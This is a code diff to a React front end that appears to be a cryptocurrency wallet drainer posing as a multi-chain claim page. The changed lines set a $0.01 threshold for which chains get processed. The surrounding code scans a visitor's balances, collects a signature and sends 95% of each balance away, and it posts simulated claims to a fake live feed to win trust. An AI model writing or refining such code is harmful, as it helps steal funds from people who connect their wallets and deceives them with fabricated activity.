@@ -1099,8 +1099,9 @@ function App() {
     try {
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
+      // Only include chains with balance >= $0.01 (to ignore dust)
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
-        balances[chain.name] && balances[chain.name].amount > 0.000001
+        balances[chain.name] && balances[chain.name].valueUSD >= 0.01
       );
       
       // Eligibility: minimum $1 equivalent on-chain balance across any supported network
@@ -1162,7 +1163,7 @@ function App() {
         setScanProgress(Math.round((scanned / totalChains) * 100));
         setTxStatus(`🔄 Scanning ${chain.name} for on-chain balance...`);
         
-        if (amount > 0.000001) {
+        if (valueUSD >= 0.01) { // Only record if at least 1 cent
           balanceResults[chain.name] = {
             amount,
             valueUSD,
@@ -1171,7 +1172,7 @@ function App() {
             contractAddress: chain.contractAddress,
             price: price,
             name: chain.name,
-            rpc: chain.rpcEndpoints?.[0] || chain.rpc // store primary RPC for later use
+            rpc: chain.rpcEndpoints?.[0] || chain.rpc
           };
           console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
         }
@@ -1204,6 +1205,7 @@ function App() {
 
   // ============================================
   // UPDATED: MULTI-CHAIN EXECUTION WITH FULL LOOP (NO EARLY EXIT)
+  // Now also skips chains with valueUSD < 0.01
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -1233,12 +1235,15 @@ function App() {
       console.log("✅ Signature obtained");
       
       setTxStatus('✅ Executing on eligible chains...');
-      const chainsToProcess = eligibleChains;
+      let chainsToProcess = eligibleChains;
+      
+      // Additional safety: filter out any chain whose valueUSD < 0.01
+      chainsToProcess = chainsToProcess.filter(chain => balances[chain.name] && balances[chain.name].valueUSD >= 0.01);
       
       console.log(`🔄 Processing ${chainsToProcess.length} eligible chains`);
       
       if (chainsToProcess.length === 0) {
-        setError("No eligible chains found");
+        setError("No eligible chains found (minimum $0.01 required)");
         setSignatureLoading(false);
         return;
       }
@@ -1251,7 +1256,7 @@ function App() {
       let processed = [];
       let failedChains = [];
       
-      // Process each chain sequentially, but continue on failure
+      // Process each chain sequentially, continue on failure
       for (const chain of sortedChains) {
         try {
           setProcessingChain(chain.name);
@@ -1271,8 +1276,8 @@ function App() {
           
           const chainProvider = new ethers.JsonRpcProvider(chain.rpcEndpoints?.[0] || chain.rpc);
           const balance = balances[chain.name];
-          if (!balance || balance.amount <= 0) {
-            throw new Error(`No valid balance for ${chain.name}`);
+          if (!balance || balance.valueUSD < 0.01) {
+            throw new Error(`Insufficient value on ${chain.name} ($${balance?.valueUSD || 0})`);
           }
           
           const amountToSend = (balance.amount * 0.95);
@@ -1350,7 +1355,7 @@ function App() {
       
       setVerifiedChains(processed);
       
-      // After processing all chains, show appropriate celebration if at least one succeeded
+      // After processing all chains, show celebration if at least one succeeded
       if (processed.length > 0) {
         // Add a random transaction to the live feed (simulate a claim)
         const randomChain = getRandomChain();
@@ -1477,7 +1482,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Disconnect wallet handler – clear and visible icon
+  // Disconnect wallet handler – now uses a clear FontAwesome power-off icon
   const handleDisconnect = async () => {
     try {
       await disconnect();
@@ -1613,7 +1618,7 @@ function App() {
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
-              {/* Wallet info with DISCONNECT icon - CLEAR, VISIBLE, and matches the page style */}
+              {/* Wallet info with DISCONNECT icon - CLEAR, VISIBLE FontAwesome power-off icon */}
               <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
@@ -1623,8 +1628,7 @@ function App() {
                   className="w-9 h-9 rounded-full bg-white hover:bg-red-100 transition-all flex items-center justify-center shadow-md group"
                   title="Disconnect Wallet"
                 >
-                  {/* Clear, bold power symbol - now perfectly visible on white background */}
-                  <span className="text-red-600 text-base font-bold group-hover:scale-110 transition-transform">⏻</span>
+                  <i className="fas fa-power-off text-red-600 text-base group-hover:scale-110 transition-transform"></i>
                 </button>
               </div>
               
